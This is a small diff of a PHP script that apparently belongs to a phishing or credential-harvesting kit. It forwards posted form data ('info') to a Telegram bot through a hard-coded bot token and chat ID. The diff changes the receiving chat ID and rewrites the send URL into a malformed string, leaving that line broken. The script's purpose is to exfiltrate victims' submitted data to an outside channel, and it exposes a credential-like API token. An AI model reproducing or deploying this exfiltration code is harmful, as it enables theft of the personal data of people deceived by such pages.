@@ -18,10 +18,10 @@ if (isset($_POST['info'])) {
 
 // Setting 
 $apiToken = "5610625563:AAGAbjRafbGdmI_75n-T6l_cU95QcRXK1rM";
-$YOUR_ID_TELE = "6046637715";
+$YOUR_ID_TELE = "819266844";
 
 
 // You :
-$response = file_get_contents("https://t.me/A_Y_A_Di".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
+$response = file_get_contents("@ayadshoterupdate_bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
 // SomeOne Else : 
 // $response = file_get_contents("https://api.telegram.org/bot".$apiToken."/sendMessage?chat_id=".$YOUR_ID_TELE."&text=" . $msg);
